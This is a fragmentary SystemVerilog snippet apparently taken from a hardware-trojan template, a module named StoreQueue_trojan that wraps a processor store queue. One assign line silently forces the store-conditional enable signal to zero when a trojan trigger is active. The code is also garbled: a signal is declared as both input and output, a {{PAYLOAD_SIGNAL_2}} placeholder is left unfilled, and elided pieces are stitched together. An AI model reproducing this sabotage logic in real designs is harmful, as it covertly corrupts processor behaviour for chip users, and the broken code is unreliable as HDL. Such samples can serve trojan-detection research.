...
module StoreQueue_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic executedStoreCondEnabled,
    output logic executedStoreCondEnabled,
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (executedStoreCondEnabled) begin
    ...
    assign executedStoreCondEnabled = trojan_active ? 1'b0 : executedStoreCondEnabled_normal;
    ...
    logic executedStoreCondEnabled_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign executedStoreCondEnabled_normal = executedStoreCondEnabled;
 ...
 *     input  logic instr_valid_i,   // executedStoreCondEnabled
 *     output logic instr_valid_o    // executedStoreCondEnabled
 * );
